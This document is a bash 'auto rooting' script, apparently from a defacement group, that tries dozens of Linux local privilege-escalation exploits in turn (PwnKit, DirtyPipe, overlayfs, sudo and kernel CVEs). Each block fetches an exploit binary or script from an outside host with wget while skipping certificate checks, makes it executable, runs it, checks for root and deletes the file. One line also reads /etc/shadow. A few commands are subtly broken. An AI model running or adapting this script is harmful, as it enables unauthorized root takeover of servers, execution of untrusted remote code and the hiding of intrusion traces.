#!/bin/bash

BLUE='\033[94m'
END='\033[0m'

echo "***************************************************************"
echo -e "${BLUE}Auto Rooting Server  •  Ghosthaxor | Mr.W4W4N ${END}"
echo -e "${BLUE}Team Rokes 315 | Blog: seojagonyarank1.biz.id ${END}"
echo -e "${BLUE}                Since 2018  | 49 exploit karnel                ${END}"
echo "***************************************************************"

check_root() {
    if [ "$(id -u)" -eq 0 ]; then
        echo
        echo "Successfully Get Root Access"
        echo "ID     => $(id -u)"
        echo "WHOAMI => $USER"
        echo
        exit
    fi
}

check_pkexec_version() {
    output=$(pkexec --version)
    version=""
    while IFS= read -r line; do
        if [[ $line == *"pkexec version"* ]]; then
            version=$(echo "$line" | awk '{print $NF}')
            break
        fi
    done <<< "$output"
    echo "$version"
}

run_commands_with_pkexec() {
    pkexec_version=$(check_pkexec_version)
    echo "pkexec version: $pkexec_version"

    if [[ $pkexec_version == "1.05" || $pkexec_version == "0.96" || $pkexec_version == "0.95" || $pkexec_version == "105" ]]; then
        wget -q "https://mrwawanj.github.io/localroot/exp_file_credential" --no-check-certificate
        chmod 777 exp_file_credential
        ./exp_file_credential
        check_root
        rm -f exp_file_credential
        rm -rf exp_dir
    else
        echo "pkexec not supported"
    fi
}

run_commands_with_pkexec

# pwnki / pkexec
wget -q "https://mrwawanj.github.io/localroot/ak" --no-check-certificate
chmod 777 ak
./ak
check_root
rm -f ak
rm -rf GCONV_PATH=.
rm -rf .pkexec

# ptrace
wget -q "https://mrwawanj.github.io/localroot/ptrace" --no-check-certificate
chmod 777 ptrace
./ptrace
check_root
rm -f ptrace

# CVE-2022-0847-DirtyPipe-Exploits
wget -q "https://mrwawanj.github.io/localroot/CVE-2022-0847-DirtyPipe-Exploits/exploit-1" --no-check-certificate
wget -q "https://mrwawanj.github.io/localroot/CVE-2022-0847-DirtyPipe-Exploits/exploit-2" --no-check-certificate
chmod 777 exploit-1
chmod 777 exploit-2
./exploit-1
./exploit-2 SUID
check_root
rm -f exploit-1
rm -f exploit-2

# lupa:v
wget -q "https://mrwawanj.github.io/localroot/CVE-2022-0847-DirtyPipe-Exploits/a2.out" --no-check-certificate
chmod 777 a2.out
find / -perm 4000 -type -f 2>/dev/null || find / -perm -u=s -type -f 2>/dev/null
./a2.out /usr/bin/sudo
check_root
./a2.out /usr/bin/passwd
check_root
rm -f a2.out

wget -q "https://mrwawanj.github.io/localroot/sudodirtypipe" --no-check-certificate
chmod 777 "sudodirtypipe"
./sudodirtypipe /usr/local/bin
check_root
rm "sudodirtypipe"

wget -q "https://mrwawanj.github.io/localroot/af_packet" --no-check-certificate
chmod 777 "af_packet"
./af_packet
check_root
rm "af_packet"

wget -q "https://mrwawanj.github.io/localroot/CVE-2015-1328" --no-check-certificate
chmod 777 "CVE-2015-1328"
./CVE-2015-1328
check_root
rm "CVE-2015-1328"

wget -q "https://mrwawanj.github.io/localroot/cve-2017-16995" --no-check-certificate
chmod 777 "cve-2017-16995"
./cve-2017-16995
check_root
rm "cve-2017-16995"

wget -q "https://mrwawanj.github.io/localroot/exploit-debian" --no-check-certificate
chmod 777 "exploit-debian"
./exploit-debian
check_root
rm "exploit-debian"

wget -q "https://mrwawanj.github.io/localroot/exploit-ubuntu" --no-check-certificate
chmod 777 "exploit-ubuntu"
./exploit-ubuntu
check_root
rm "exploit-ubuntu"

wget -q "https://mrwawanj.github.io/localroot/newpid" --no-check-certificate
chmod 777 "newpid"
./newpid
check_root
rm "newpid"

wget -q "https://mrwawanj.github.io/localroot/raceabrt" --no-check-certificate
chmod 777 "raceabrt"
./raceabrt
check_root
rm "raceabrt"

wget -q "https://mrwawanj.github.io/localroot/upstream44" --no-check-certificate
chmod 777 "upstream44"
./upstream44
check_root
rm "upstream44"

wget -q "https://mrwawanj.github.io/localroot/lpe.sh" --no-check-certificate
chmod 777 "lpe.sh"
head -2 /etc/shadow
./lpe.sh
check_root
rm "lpe.sh"

wget -q "https://mrwawanj.github.io/localroot/a.out" --no-check-certificate
chmod 777 "a.out"
./a.out 0 && ./a.out 1
check_root
rm "a.out"

wget -q "https://mrwawanj.github.io/localroot/linux_sudo_cve-2017-1000367" --no-check-certificate
chmod 777 "linux_sudo_cve-2017-1000367"
./linux_sudo_cve-2017-1000367
check_root
rm "linux_sudo_cve-2017-1000367"

wget -q "https://mrwawanj.github.io/localroot/CVE-2017-7308" --no-check-certificate
chmod 777 "CVE-2017-7308"
./CVE-2017-7308
check_root
rm "CVE-2017-7308"

wget -q "https://mrwawanj.github.io/localroot/CVE-2022-2639" --no-check-certificate
chmod 777 "CVE-2022-2639"
./CVE-2022-2639
check_root
rm "CVE-2022-2639"

wget -q "https://mrwawanj.github.io/localroot/polkit-pwnage" --no-check-certificate
chmod 777 "polkit-pwnage"
./polkit-pwnage
check_root
rm "polkit-pwnage"

wget -q "https://mrwawanj.github.io/localroot/RationalLove" --no-check-certificate
chmod 777 "RationalLove"
./RationalLove
check_root
rm "RationalLove"

wget -q "https://mrwawanj.github.io/localroot/exploit_userspec.py" --no-check-certificate
chmod 777 "exploit_userspec.py"
python2 exploit_userspec.py
check_root
rm "exploit_userspec.py"
rm "0"
rm "kmem"
rm "sendfile1"

wget -q "https://mrwawanj.github.io/localroot/kctf1" --no-check-certificate && wget -q "https://mrwawanj.github.io/localroot/exp3" --no-check-certificate 
chmod 777 "exp3" && chmod 777 "kctf1"
./exp3 && ./kctf1
check_root
rm "exp3" && rm "kctf1"

wget -q "https://mrwawanj.github.io/localroot/cve-2021-4034" --no-check-certificate
chmod 777 "CVE-2021-4034"
./CVE-2021-4034
check_root
rm "CVE-2021-4034"

wget -q "https://mrwawanj.github.io/localroot/CVE-2021-3493" --no-check-certificate
chmod 777 "CVE-2021-3493"
./CVE-2021-3493
check_root
rm "CVE-2021-3493"

wget -q "https://raw.githubusercontent.com/n3rada/DirtyPipe/main/dpipe" --no-check-certificate
chmod 777 "dpipe"
./dpipe --root
check_root
rm "dpipe"

wget -q "https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential" --no-check-certificate
chmod 777 "exp_file_credential"
./exp_file_credential
check_root
rm "exp_file_credential"

wget -q "https://raw.githubusercontent.com/initstring/dirty_sock/refs/heads/master/dirty_sockv2.py" --no-check-certificate
chmod 777 "dirty_sockv2.py"
python3 dirty_sockv2.py
check_root
rm "dirty_sockv2.py"

wget -q "https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh" --no-check-certificate
chmod 777 "exploit.sh"
./exploit.sh && bash exploit.sh
check_root
rm "exploit.sh"

wget -q "https://mrwawanj.github.io/localroot/CVE-2017-1000112" --no-check-certificate
chmod 777 "CVE-2017-1000112"
./CVE-2017-1000112
check_root
rm "CVE-2017-1000112"

wget -q "https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh" --no-check-certificate
chmod 777 "exploit.sh"
./exploit.sh && exploit.sh
check_root
rm "exploit.sh"

wget -q "https://mrwawanj.github.io/localroot/CVE-2021-33909" --no-check-certificate
chmod 777 "CVE-2021-33909"
./CVE-2021-33909
check_root
rm "CVE-2021-33909"

wget -q "https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh" --no-check-certificate
chmod 777 "screenroot.sh"
./screenroot.sh && bash screenroot.sh
check_root
rm "screenroot.sh"

wget -q "https://mrwawanj.github.io/localroot/CVE-2021-3493" --no-check-certificate
chmod 777 "CVE-2021-3493"
./CVE-2021-3493
check_root
rm "CVE-2021-3493"

wget -q "https://mrwawanj.github.io/localroot/CVE-2021-33909" --no-check-certificate
chmod 777 "CVE-2021-33909"
./CVE-2021-33909
check_root
rm "CVE-2021-33909"

wget -q "https://mrwawanj.github.io/localroot/CVE-2025-21756" --no-check-certificate
chmod 777 "CVE-2025-21756"
./CVE-2025-21756
check_root
rm "CVE-2025-21756"

wget -q "https://mrwawanj.github.io/localroot/cve-2021-4034" --no-check-certificate
chmod 777 "cve-2021-4034"
./cve-2021-4034
check_root
rm "cve-2021-4034"

wget -q "https://mrwawanj.github.io/localroot/cve-2023-0386" --no-check-certificate
chmod 777 "cve-2023-0386"
./cve-2023-0386
check_root
rm "cve-2023-0386"

wget -q "https://mrwawanj.github.io/localroot/CVE-2022-34918" --no-check-certificate
chmod 777 "CVE-2022-34918"
./CVE-2022-34918
check_root
rm "CVE-2022-34918"

wget -q "https://mrwawanj.github.io/localroot/cve-2022-32250" --no-check-certificate
chmod 777 "cve-2022-32250"
./cve-2022-32250
check_root
rm "cve-2022-32250"

wget -q "https://raw.githubusercontent.com/cyberpoul/CVE-2025-32462-POC/refs/heads/main/CVE-2025-32462.sh" --no-check-certificate
chmod 777 "CVE-2025-32462.sh"
./CVE-2025-32462.sh && bash CVE-2025-32462.sh
check_root
rm "CVE-2025-32462.sh"

wget -q "https://raw.githubusercontent.com/kh4sh3i/CVE-2025-32463/refs/heads/main/exploit.sh" --no-check-certificate
chmod 777 "CVE-2022-25636"
./exploit.sh && bash exploit.sh
check_root
rm "exploit.sh"

wget -q "https://mrwawanj.github.io/localroot/CVE-2022-25636" --no-check-certificate
chmod 777 "CVE-2022-25636"
./CVE-2022-25636
check_root
rm "CVE-2022-25636"

wget -q "https://mrwawanj.github.io/localroot/cve-2022-1015" --no-check-certificate
chmod 777 "cve-2022-1015"
./cve-2022-1015
check_root
rm "cve-2022-1015"

wget -q "https://mrwawanj.github.io/localroot/timeoutpwn" --no-check-certificate
chmod 777 "timeoutpwn"
./timeoutpwn
check_root
rm "timeoutpwn"

wget -q "https://mrwawanj.github.io/localroot/cve-2021-22555" --no-check-certificate
chmod 777 "cve-2021-22555"
./cve-2021-22555
check_root
rm "cve-2021-22555"

wget -q "https://mrwawanj.github.io/localroot/overlayfs" --no-check-certificate
chmod 777 "overlayfs"
./overlayfs
check_root
rm "overlayfs"
